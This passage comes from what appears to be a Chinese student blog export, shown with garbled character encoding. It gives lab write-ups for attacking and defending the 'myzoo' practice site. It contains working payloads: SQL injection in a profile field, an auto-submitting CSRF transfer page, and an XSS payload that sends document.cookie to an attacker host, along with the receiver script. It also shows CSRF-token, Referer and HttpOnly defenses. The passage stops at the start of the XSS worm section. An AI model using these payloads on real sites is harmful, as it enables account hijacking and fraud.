<h3 id="æ–¹æ³•ä¸€ï¼šåˆ©ç”¨css"><a href="#æ–¹æ³•ä¸€ï¼šåˆ©ç”¨css" class="headerlink" title="æ–¹æ³•ä¸€ï¼šåˆ©ç”¨css"></a>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨css</h3><ol>
<li><p>åœ¨aç”¨æˆ·çš„profileä¸­è¾“å…¥</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=&quot;http://<span class="number">106.13</span>.<span class="number">136.87</span>:<span class="number">8080</span>/<span class="number">100</span>.png<span class="string">&quot; style=&quot;</span>position:relative;<span class="attribute">top</span>:-<span class="number">55px</span>;<span class="attribute">right</span>:-<span class="number">63px</span>;<span class="attribute">width</span>:<span class="number">34px</span>;<span class="attribute">height</span>:<span class="number">21px</span><span class="string">&quot;/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ç„¶åbç”¨æˆ·åœ¨Userä¸­è¾“å…¥ç”¨æˆ·åaï¼Œå°±ä¼šçœ‹åˆ°aæœ‰100ä¸ªzoobarsï¼Œå…¶å®aå¹¶æ²¡æœ‰100ä¸ª</p>
</li>
</ol>
<h2 id="æ–¹æ³•äºŒï¼šsqlæ³¨å…¥"><a href="#æ–¹æ³•äºŒï¼šsqlæ³¨å…¥" class="headerlink" title="æ–¹æ³•äºŒï¼šsqlæ³¨å…¥"></a>æ–¹æ³•äºŒï¼šsqlæ³¨å…¥</h2><ol>
<li><p>æºç ä¸­ï¼Œå¤„ç†$profileå‚æ•°sqlè¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE Person SET Profile=&#x27;$profile&#x27; &quot;.</span><br><span class="line">           &quot;WHERE PersonID=$user-&gt;id&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å‡è®¾ç¬¬ä¸€ä¸ªç”¨æˆ·aåœ¨profileä¸­è¾“å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;,Zoobars=9999,Profile=&#x27;</span>Welcome <span class="keyword">to</span> my profile<span class="operator">!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æœ€åæ‰§è¡Œçš„sqlå¦‚ä¸‹</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> Person <span class="keyword">set</span> Profile<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,Zoobars<span class="operator">=</span><span class="number">9999</span>,Profile<span class="operator">=</span><span class="string">&#x27;Welcome to my profile!&#x27;</span> <span class="keyword">where</span> PeronID<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>æœ€åå†å»æŸ¥açš„ä½™é¢å°±æœ‰9999ä¸ªzoobars</p>
</li>
</ol>
]]></content>
      <categories>
        <category>ä¿¡æ¯å®‰å…¨å®è·µ</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯å®‰å…¨å®è·µLab3-CSRF&amp;XSS&amp;Click Jacking</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab3-CSRF&amp;XSS&amp;%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h1 id="ä¿¡æ¯å®‰å…¨å®è·µLab3-CSRF-amp-XSS-amp-Click-Jacking"><a href="#ä¿¡æ¯å®‰å…¨å®è·µLab3-CSRF-amp-XSS-amp-Click-Jacking" class="headerlink" title="ä¿¡æ¯å®‰å…¨å®è·µLab3-CSRF&amp;XSS&amp;Click Jacking"></a>ä¿¡æ¯å®‰å…¨å®è·µLab3-CSRF&amp;XSS&amp;Click Jacking</h1><p>è¯¥å®éªŒå¯ä»¥åœ¨ä¸€å°è™šæ‹Ÿæœºä¸Šå®Œæˆï¼Œæœ¬æ–‡é‡‡ç”¨ä¸¤å°è™šæ‹Ÿæœºçš„æ–¹å¼ï¼Œmyzooç½‘ç«™æ‰€åœ¨è™šæ‹Ÿæœºipï¼š10.211.55.14 , æ”»å‡»è€…ç½‘ç«™æ‰€åœ¨è™šæ‹Ÿæœºipï¼š10.211.55.16 ã€‚</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>åœ¨zoobarç½‘ç«™ä¸Šå±•ç¤ºå¹¶é˜²å¾¡CSRFæ”»å‡»ã€‚è¯·æ³¨æ„åœ¨é˜²å¾¡æ—¶çš„ç²’åº¦é—®é¢˜ï¼Œé˜²æ­¢æ‰€æœ‰äººçš„tokenéƒ½ä¸€æ ·ï¼›ä»¥åŠåˆ·æ–°å¤ªå¿«ï¼Œæ­£å¸¸æ“ä½œéƒ½å¤±è´¥ã€‚</p>
<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>å…ˆåœ¨myzooç½‘ç«™æ³¨å†Œä¸¤ä¸ªè´¦å· victimå’Œcsrfattackã€‚</p>
<p>æ”»å‡»è€…æœåŠ¡å™¨æ‰€åœ¨è™šæ‹Ÿæœºé…ç½®(10.211.55.16)ï¼š</p>
<p>1.å®‰è£…apache2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>

<p>2.å…³é—­é˜²ç«å¢™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>3.é…ç½®hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">åœ¨æœ€åæ·»åŠ  </span><br><span class="line">10.211.55.14  www.myzoo.com  #è¿™é‡Œçš„ipå¡«å†™myzooæœåŠ¡å™¨çš„ipåœ°å€</span><br><span class="line">127.0.0.1 www.attack.com </span><br></pre></td></tr></table></figure>

<p>4.ç¼–å†™index.htmlæ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cd /var/www/html</span><br><span class="line">sudo vim index.html</span><br><span class="line">å°†ä¸‹é¢çš„å†…å®¹å¤åˆ¶è¿›å»å³å¯</span><br></pre></td></tr></table></figure>

<p><strong>index.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>my profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;450px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;csrfattack&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://106.13.136.87:8080/101.jpeg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzooç½‘ç«™æ‰€åœ¨è™šæ‹Ÿæœºé…ç½®(10.211.55.14):</p>
<p>1.å…³é—­é˜²ç«å¢™</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>2.é…ç½®hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">åœ¨æœ€åæ·»åŠ  </span><br><span class="line">127.0.0.1  www.myzoo.com</span><br><span class="line">10.211.55.16 www.attack.com #è¿™é‡Œçš„ipå¡«å†™æ”»å‡»è€…æœåŠ¡å™¨çš„ipåœ°å€</span><br></pre></td></tr></table></figure>

<h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>1.åœ¨csrfattackè´¦å·çš„profileä¸­å†™å…¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com&quot;</span>&gt;</span> ç‚¹å‡»æŸ¥çœ‹æˆ‘çš„ç…§ç‰‡å“¦<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç‚¹å‡»saveã€‚</p>
<p>2.åœ¨10.211.55.14ä¸Šç™»å½•victimè´¦æˆ·ï¼Œvictimç”¨æˆ·å»æŸ¥çœ‹csrfattackçš„profile</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234357.png" alt="æˆªå±2021-01-05 ä¸Šåˆ4.06.02"></p>
<p>å½“victimç‚¹å‡»è¯¥é“¾æ¥åï¼Œå°±ä¼šå‘csrfattackè½¬1ä¸ªzoobarsã€‚</p>
<h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><h4 id="æ–¹æ³•1-ä½¿ç”¨session"><a href="#æ–¹æ³•1-ä½¿ç”¨session" class="headerlink" title="æ–¹æ³•1:ä½¿ç”¨session"></a>æ–¹æ³•1:ä½¿ç”¨session</h4><p>ä¿®æ”¹transfer.phpæ–‡ä»¶ï¼š</p>
<p>1.åœ¨å¼€å¤´åŠ å…¥ä¸‹é¢çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.ä¿®æ”¹ifè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>3.åœ¨45-47è¡ŒåŠ å…¥ä¸‹é¢å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.åœ¨formä¸­æ·»åŠ ä¸‹é¢çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åçš„transfer.phpå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line">	    <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ–¹æ³•2-éªŒè¯HTTP-Referer"><a href="#æ–¹æ³•2-éªŒè¯HTTP-Referer" class="headerlink" title="æ–¹æ³•2:éªŒè¯HTTP Referer"></a>æ–¹æ³•2:éªŒè¯HTTP Referer</h4><p>ä¿®æ”¹transfer.phpæ–‡ä»¶ï¼š</p>
<p>1.ä¿®æ”¹ifè¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] == <span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>åœ¨zoobarç½‘ç«™ä¸Šå±•ç¤ºå¹¶é˜²å¾¡XSSæ”»å‡»ã€‚è¯·æ³¨æ„å®ç°cookieçªƒå–ã€ä»¥åŠxssè •è™«ã€‚</p>
<p>å¦‚æœä¸ä¿®æ”¹myzoo&#x2F;user.phpæºç ï¼Œå¾ˆéš¾å®ç°XSSæ”»å‡»</p>
<p>ä¿®æ”¹ myzoo&#x2F;user.phpæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allowed_tags</span> = </span><br><span class="line">      <span class="string">&#x27;&lt;script&gt;&lt;a&gt;&lt;br&gt;&lt;b&gt;&lt;h1&gt;&lt;h2&gt;&lt;h3&gt;&lt;h4&gt;&lt;i&gt;&lt;img&gt;&lt;li&gt;&lt;ol&gt;&lt;p&gt;&lt;strong&gt;&lt;table&gt;&#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&lt;th&gt;&lt;u&gt;&lt;ul&gt;&lt;em&gt;&lt;span&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$disallowed</span> = </span><br><span class="line">  <span class="string">&#x27;eval|setTimeout|setInterval|target|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onAbort|onBlur|onChange|onClick|onDblClick|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onDragDrop|onFocus|onKeyDown|onKeyPress|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onKeyUp|onLoad|onMouseDown|onMouseMove|onMouseOut|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onMouseOver|onMouseUp|onMove|onReset|onResize|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onSelect|onSubmit|onUnload&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="cookieçªƒå–"><a href="#cookieçªƒå–" class="headerlink" title="cookieçªƒå–"></a>cookieçªƒå–</h3><h4 id="é…ç½®-1"><a href="#é…ç½®-1" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>åœ¨myzooç½‘ç«™åˆ›å»ºè´¦å·xssattackã€‚</p>
<p>æ”»å‡»è€…è™šæ‹Ÿæœºé…ç½®ï¼ˆ10.211.55.16ï¼‰</p>
<p>1.åˆ›å»ºxss.phpæ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/xss.php</span><br></pre></td></tr></table></figure>

<p>å°†ä¸‹é¢çš„å†…å®¹å¤åˆ¶è¿›å»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cookie</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;get cookie: &#x27;</span>.<span class="variable">$cookie</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;not get cookie&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><p>ä¿®æ”¹xssattackè´¦å·çš„profile</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=x onerror=javascript:window.<span class="built_in">open</span>(<span class="string">&quot;http://www.attack.com/xss.php?cookie=&quot;</span>+document.cookie) /&gt;</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·victimè®¿é—®xssattackï¼Œå°±ä¼šå¼¹å‡ºä¸€ä¸ªé¡µé¢é‡Œé¢ä¼šæ‰“å°è·å–åˆ°çš„cookieå€¼ã€‚</p>
<h4 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><h5 id="æ–¹æ³•ä¸€-è®¾ç½®httponly"><a href="#æ–¹æ³•ä¸€-è®¾ç½®httponly" class="headerlink" title="æ–¹æ³•ä¸€:è®¾ç½®httponly"></a>æ–¹æ³•ä¸€:è®¾ç½®httponly</h5><p>å¦‚æœcookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–cookieå†…å®¹ï¼Œè¿™æ ·å°±å¢åŠ äº†cookieçš„å®‰å…¨æ€§ã€‚</p>
<p>1.ä¿®æ”¹auth.phpæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setcookie($this-&gt;cookieName, $cookieData, time() + 31104000);</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="variable language_">$this</span>-&gt;cookieName, <span class="variable">$cookieData</span>, <span class="title function_ invoke__">time</span>() + <span class="number">31104000</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•äºŒ-ç¦ç”¨æ ‡ç­¾"><a href="#æ–¹æ³•äºŒ-ç¦ç”¨æ ‡ç­¾" class="headerlink" title="æ–¹æ³•äºŒ:ç¦ç”¨æ ‡ç­¾"></a>æ–¹æ³•äºŒ:ç¦ç”¨æ ‡ç­¾</h5><h3 id="XSSè •è™«"><a href="#XSSè •è™«" class="headerlink" title="XSSè •è™«"></a>XSSè •è™«</h3><h4 id="æ”»å‡»-2"><a href="#æ”»å‡»-2" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><p>è¿›è¡Œè¿™ä¸ªæ”»å‡»å‰éœ€è¦æŠŠcsrfçš„çš„é˜²å¾¡ç»™å»æ‰ã€‚</p>
<p>æ³¨å†Œè´¦å·xssattack1</p>
<p>ä¿®æ”¹xssattack1çš„profile</p>
